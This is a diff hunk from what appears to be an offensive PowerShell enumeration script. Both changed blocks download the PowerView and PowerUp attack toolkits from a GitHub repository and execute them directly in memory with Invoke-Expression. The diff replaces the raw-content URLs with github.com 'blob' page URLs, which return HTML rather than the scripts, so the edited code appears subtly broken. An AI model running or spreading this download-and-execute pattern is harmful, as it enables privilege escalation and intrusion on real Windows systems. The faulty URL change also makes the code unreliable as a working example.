@@ -24,7 +24,7 @@ Write-Host "Privileges:`n$($privileges -join "`n")"
 # Import powerview and powerup scripts from GitHub repository
 $scriptDir = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(".\")
 try {
-    $powerviewContent = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/powerview.ps1" -UseBasicParsing -ErrorAction Stop
+    $powerviewContent = Invoke-WebRequest -Uri "https://github.com/conma293/mvp/blob/main/powerview.ps1" -UseBasicParsing -ErrorAction Stop
     Invoke-Expression $powerviewContent.Content
     Write-Host "Powerview loaded successfully"
 }
@@ -33,7 +33,7 @@ catch {
 }
 
 try {
-    $powerupContent = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/powerup.ps1" -UseBasicParsing -ErrorAction Stop
+    $powerupContent = Invoke-WebRequest -Uri "https://github.com/conma293/mvp/blob/main/powerup.ps1" -UseBasicParsing -ErrorAction Stop
     Invoke-Expression $powerupContent.Content
     Write-Host "Powerup loaded successfully"
 }
